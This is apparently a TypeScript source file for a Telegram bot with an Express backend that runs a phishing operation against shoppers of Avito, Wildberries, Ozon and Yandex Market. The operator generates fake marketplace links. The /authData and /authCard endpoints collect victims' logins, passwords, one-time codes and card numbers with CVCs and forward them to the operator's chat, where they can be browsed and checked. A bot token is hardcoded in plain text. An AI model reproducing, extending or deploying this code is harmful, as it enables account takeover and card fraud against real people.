import TelegramApi = require('node-telegram-bot-api');
import { generateFakeLink, createLink, createLinkKb, convertLink, createUsersKb, creteUserPages } from './utils/fakelink';
import { UserLinks, Link, LinksInfo, Users, StartState, Page, User, LinksUsersData, AuthData, CardData } from './models/link';
import express = require('express');
import bodyParser = require('body-parser');
import cors = require('cors');

const app = express();
const PORT = 5555;

app.use(cors());
app.use(bodyParser.json());

app.post('/authData', async (req, res) => {
	const body = req.body;
	const user: ScamUserAuth = body;
	res.status(200);
	res.send();
	const userId = usersLinks.get(user.url);
	const message = `⚠️ Новый пользователь ⚠️\nСайт: ${user.website}\nСсылка: ${user.url}\nЛогин: ${user.authData.login}\nПароль: ${user.authData.password}\nКод: ${user.authData.code}`;
	await bot.sendMessage(userId, message);
});

app.post('/authCard', async (req, res) => {
	const body = req.body;
	const user: ScamUserCard = body;
	res.status(200);
	res.send();
	const userId = usersLinks.get(user.url);
	const message = `⚠️ Новый пользователь добавил карту ⚠️\nСайт: ${user.website}\nСсылка: ${user.url}\nЛогин: ${user.authData.login}\nПароль: ${user.authData.password}\nКод: ${user.authData.code}\nДанные карты:\nНомер: ${user.cardData.cardNumber}\nДата: ${user.cardData.cardDate}\nCVC: ${user.cardData.cvc}`;
	await bot.sendMessage(userId, message);
});

app.listen(PORT, () => {
	console.log(`API listening at http://localhost:${PORT}`);
});


const TOKEN = '6344784217:AAGWHFtxnyA69P5CvkLFsSCDzAUPbp2ixmo';

const bot = new TelegramApi(TOKEN, { polling: true, },);

interface ScamUserCard {
	authData: AuthData,
	cardData: CardData,
	url: string,
	website: string,
}


interface ScamUserAuth {
	authData: AuthData,
	url: string,
	website: string,
}


type UserState = {
	start: 'start',
	get_link: 'get_link',
	link_info: 'link_info',
	select_links: 'select_links',
	links_users: 'links_users',
}

const startUser: UserLinks = {
	avito: [],
	wildberries: [],
	ozon: [],
	yandex: [],
};

const botCommands = [
	{ command: '/start', description: 'Создать новую ссылку' },
	{ command: '/info', description: 'Получить информацию о своих ссылках' },
	{ command: '/users', description: 'Информация о своих пользователях' }
];

const states: UserState = {
	start: 'start',
	get_link: 'get_link',
	link_info: 'link_info',
	select_links: 'select_links',
	links_users: 'links_users',
};

const usersInfo: Users = {};
const usersLinks = new Map();
const usersStates = new Map();

function start() {

	async function getUserLinkInfo(callback: TelegramApi.CallbackQuery) {
		const data = callback.data?.split('_');
		const userIndex: number = +data![2];
		const currentState: LinksUsersData = usersStates.get(callback.from.id);
		const user: User = currentState.pages[currentState.currentPage][userIndex];
		const message = user.cardData === undefined ? `Данные входа:\nЛогин: ${user.authData.login}\nПароль: ${user.authData.password}\nКод для входа: ${user.authData.code}` : `Данные входа:\nЛогин: ${user.authData.login}\nПароль: ${user.authData.password}\nКод для входа: ${user.authData.code}\nДанные карты:\nНомер: ${user.cardData.cardNumber}\nДата: ${user.cardData.cardDate}\nCVC: ${user.cardData.cvc}`;
		const checkAuth = user.authWork ? `✅` : `❌`;
		const checkCard = user.cardWork ? `✅` : `❌`;
		return bot.editMessageText(message, {
			chat_id: callback.from.id,
			message_id: callback.message?.message_id,
			reply_markup: {
				inline_keyboard: [
					[{ text: `Данные входа ${checkAuth}`, callback_data: 'checkAuth' }],
					[{ text: `Данные карты ${checkCard}`, callback_data: 'checkCard' }],
					[{ text: 'Назад', callback_data: 'back_to_users' }],
				],
			}
		});
	}

	async function showUserPage(callback: TelegramApi.CallbackQuery) {
		const currentState: LinksUsersData = usersStates.get(callback.from.id);
		const kb = createUsersKb(currentState.pages, currentState.currentPage, currentState.website);
		return bot.editMessageText(`Информация по ссылке: ${currentState.url}`, {
			chat_id: callback.from.id,
			message_id: callback.message?.message_id,
			...kb,
		});
	}

	async function nextUserPage(callback: TelegramApi.CallbackQuery) {
		const curretntState = usersStates.get(callback.from.id);
		const currentPage = curretntState.currentPage;
		const pages: Page<User>[] = curretntState.pages;
		const website = curretntState.website;
		const url = curretntState.url;
		if (currentPage < pages.length - 1) {
			const kb = createUsersKb(pages, currentPage + 1, website);
			usersStates.set(callback.from.id, { state: states.links_users, currentPage: currentPage + 1, pages: pages, url: url, website: website });
			return bot.editMessageText(`Информация по ссылке: ${url}`, {
				chat_id: callback.from.id,
				message_id: callback.message?.message_id,
				...kb,
			});
		}
		if (currentPage === pages.length - 1) {
			const kb = createUsersKb(pages, 0, website);
			usersStates.set(callback.from.id, { state: states.links_users, currentPage: 0, pages: pages, url: url, website: website });
			return bot.editMessageText(`Информация по ссылке: ${url}`, {
				chat_id: callback.from.id,
				message_id: callback.message?.message_id,
				...kb,
			});
		}
	}

	async function backUserPage(callback: TelegramApi.CallbackQuery) {
		const curretntState = usersStates.get(callback.from.id);
		const currentPage = curretntState.currentPage;
		const pages: Page<User>[] = curretntState.pages;
		const website = curretntState.website;
		const url = curretntState.url;
		if (currentPage > 0) {
			const kb = createUsersKb(pages, currentPage - 1, website);
			usersStates.set(callback.from.id, { state: states.links_users, currentPage: currentPage - 1, pages: pages, url: url, website: website });
			return bot.editMessageText(`Информация по ссылке: ${url}`, {
				chat_id: callback.from.id,
				message_id: callback.message?.message_id,
				...kb,
			});
		}
		if (currentPage === 0) {
			const kb = createUsersKb(pages, pages.length - 1, website);
			usersStates.set(callback.from.id, { state: states.links_users, currentPage: pages.length - 1, pages: pages, url: url, website: website });
			return bot.editMessageText(`Информация по ссылке: ${url}`, {
				chat_id: callback.from.id,
				message_id: callback.message?.message_id,
				...kb,
			});
		}
	}

	async function linkInfo(callback: TelegramApi.CallbackQuery) {
		const currentState = usersStates.get(callback.from.id);
		const website = currentState.website;
		const links: Link[] = currentState.links;
		const linksIndex = callback.data!;
		const users = links[+linksIndex].users;
		const pages = creteUserPages(users);
		const kb = createUsersKb(pages, 0, website);
		usersStates.set(callback.from.id, { state: states.links_users, currentPage: 0, pages: pages, url: `${links[+linksIndex].link}`, website: website, })
		await bot.editMessageText(`Информация по ссылке: ${links[+linksIndex].link}`, {
			chat_id: callback.from.id,
			message_id: callback.message?.message_id,
			...kb,
		});
	}

	async function exitInfo(callback: TelegramApi.CallbackQuery) {
		usersStates.set(callback.from.id, { state: states.start });
		await bot.deleteMessage(callback.from.id, callback.message!.message_id);
	}

	async function getLink(message: TelegramApi.Message) {
		const chatId = message.chat.id;
		const currentState = usersStates.get(chatId);
		const msgWait = await bot.sendMessage(chatId, 'Генерируем ссылку...');
		const url = generateFakeLink(currentState.link);
		usersInfo[message.chat.id][currentState.link].push(createLink(url));
		usersLinks.set(url, chatId);
		await bot.editMessageText(`Ссылка успешно сгенерирована ✅`, {
			chat_id: chatId,
			message_id: msgWait.message_id,
		});
		const fakeLink = `<a href='${generateFakeLink(currentState.link)}'>${message.text}</a>`;
		usersStates.set(chatId, { state: states.start });
		return bot.sendMessage(message.chat.id, url, {
			disable_web_page_preview: true,
			parse_mode: 'HTML',
		});
	}

	async function getAllSites(callback: TelegramApi.CallbackQuery) {
		const linkInfo = getUserInfo(callback.from.id);
		usersStates.set(callback.from.id, { state: states.link_info });
		await bot.editMessageText('Информация по вашим ссылкам', {
			chat_id: callback.from.id,
			message_id: callback.message?.message_id,
			reply_markup: {
				inline_keyboard: [
					[{ text: `Avito (Доступно ${linkInfo.avito})`, callback_data: 'avito' }],
					[{ text: `WildBerries (Доступно ${linkInfo.wildberries})`, callback_data: 'wildberries' }],
					[{ text: `Ozon (Доступно ${linkInfo.ozon})`, callback_data: 'ozon' }],
					[{ text: `Яндекс маркет (Доступно ${linkInfo.yandex})`, callback_data: 'yandex' }],
					[{ text: `Выход ❌`, callback_data: 'close_info' }],
				],
			},
		});
	}

	async function getAllLinks(callback: TelegramApi.CallbackQuery) {
		const links = getLinks(callback.data!, callback.from.id);
		if (links.length === 0) {
			return bot.editMessageText('У вас нет ссылок на данный сайт', {
				chat_id: callback.from.id,
				message_id: callback.message?.message_id,
				reply_markup: {
					inline_keyboard: [
						[{ text: 'Назад', callback_data: 'user_links' }],
					],
				}
			});
		}
		usersStates.set(callback.from.id, { state: states.select_links, website: callback.data, links: links });
		const kb = createLinkKb(links);
		return bot.editMessageText(`${convertLink(callback.data!)}`, {
			chat_id: callback.from.id,
			message_id: callback.message?.message_id,
			...kb,
		});
	}

	function getLinks(query: string, userId: number): Link[] {
		return usersInfo[userId][query];
	}

	function getUserInfo(userId: number): LinksInfo {
		const user = usersInfo[userId];
		if (!user) {
			bot.sendMessage(userId, 'У вас еще не создана ни одна ссылка!\nЧтобы создать ссылку пропишите /start')
			return {
				avito: 0,
				wildberries: 0,
				ozon: 0,
				yandex: 0
			};
		}
		return {
			avito: user.avito.length,
			wildberries: user.wildberries.length,
			ozon: user.ozon.length,
			yandex: user.yandex.length
		}
	}

	bot.setMyCommands(botCommands);

	bot.onText(/\/start/, async msg => {
		const chatId = msg.chat.id;
		const checkUser = chatId in usersInfo;
		if (!checkUser) {
			usersInfo[chatId] = startUser;
		}
		usersStates.set(chatId, { state: states.start });
		console.log(usersInfo);
		console.log(usersStates);
		return bot.sendMessage(chatId, 'Какую ссылку нужно создать?', {
			reply_markup: {
				inline_keyboard: [
					[{ text: 'Avito', callback_data: 'avito' }],
					[{ text: 'Wildberries', callback_data: 'wildberries' }],
					[{ text: 'Ozon', callback_data: 'ozon' }],
					[{ text: 'Яндекс маркет', callback_data: 'yandex' }],
				],
				resize_keyboard: true,
			},
		});
	});

	bot.on('callback_query', async callback => {
		const data = callback.data;
		const chatId = callback.from.id;
		const currentState = usersStates.get(chatId);
		if (data === 'close_info') return exitInfo(callback);
		if (data === 'user_links') return getAllSites(callback);
		if (currentState.state === states.select_links) return linkInfo(callback);
		if (currentState.state === states.link_info) return getAllLinks(callback);
		if (currentState.state === states.links_users) {
			if (data?.includes('get_user')) return getUserLinkInfo(callback);
			if (data === 'next_user_page') return nextUserPage(callback);
			if (data === 'back_user_page') return backUserPage(callback);
			if (data === 'back_to_users') return showUserPage(callback);
			if (data === 'back') {
				callback.data = currentState.website;
				return getAllLinks(callback);
			}
			if (data === 'users_page_counter') return;
		}
		if ((data === 'avito') || (data === 'wildberries') || (data === 'ozon') || (data === 'yandex')) {
			await bot.editMessageText('Теперь отрпавь ссылку-маску', {
				chat_id: callback.from.id,
				message_id: callback.message?.message_id,
			});
			usersStates.set(callback.from.id, { state: states.get_link, link: data });
		}
	})

	bot.onText(/\/info/, async msg => {
		const chatId = msg.chat.id;
		const linkInfo = getUserInfo(chatId);
		usersStates.set(chatId, { state: states.link_info });
		await bot.sendMessage(chatId, 'Информация по вашим ссылкам', {
			reply_markup: {
				inline_keyboard: [
					[{ text: `Avito (Доступно ${linkInfo.avito})`, callback_data: 'avito' }],
					[{ text: `WildBerries (Доступно ${linkInfo.wildberries})`, callback_data: 'wildberries' }],
					[{ text: `Ozon (Доступно ${linkInfo.ozon})`, callback_data: 'ozon' }],
					[{ text: `Яндекс маркет (Доступно ${linkInfo.yandex})`, callback_data: 'yandex' }],
					[{ text: `Выход ❌`, callback_data: 'close_info' }],
				],
				resize_keyboard: true,
			},
		});
	});

	bot.on('message', async message => {
		const chatId = message.chat.id;
		const currentState = usersStates.get(chatId);
		if (currentState == undefined) return;
		if (currentState.state === 'get_link') return getLink(message);
		if ((message.text === '/start') || (message.text === '/info') || (message.text || '/users')) return;
		return bot.sendMessage(chatId, 'Комманда не найдена');
	});
}

start();